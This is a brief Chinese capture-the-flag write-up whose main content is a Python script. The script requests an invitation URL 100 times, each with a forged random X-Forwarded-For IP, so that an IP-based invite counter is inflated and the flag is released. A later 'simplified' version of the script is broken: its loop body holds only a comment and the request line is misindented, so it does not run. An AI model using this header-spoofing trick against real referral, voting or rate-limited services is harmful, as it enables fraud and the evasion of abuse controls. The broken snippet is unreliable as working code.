---
title: "Flag免费送"
date: 2026-10-17T18:29:16+08:00
weight: 45
draft: false
---

```python
import random
import requests

def generateIP():
    return '.'.join(str(random.randint(0, 255)) for _ in range(4))

print(1)
if __name__ == '__main__':
    s = requests.Session()
    s.trust_env = False 
    url = "http://202.120.222.171:30230/invitation/f8126c03ef39008ecb88badff8f2071c" # 填写你的邀请链接
    print(2)
    for i in range(100):
        print(i)
        r = s.get(url, headers={"X-Forwarded-For": generateIP()}, timeout=10)
    print(r.status_code, r.text[:200])
#print('ok')

```
学习到在python里也可以用request访问url。更新了[Digging into HTTP](/notes/web/webwp/digging-into-http/)的解法。

后面更新了代理的环境变量。简化成了
```python
if __name__ == '__main__':
    url = "http://202.120.222.171:30230/invitation/f8126c03ef39008ecb88badff8f2071c" # 填写你的邀请链接
    print(2)
    for i in range(100):
        #print(i)
    r = requests.get(url, headers={"x-forwarded-for": generateIP()})
    print(r.status_code, r.text[:200])
#print('ok')

```
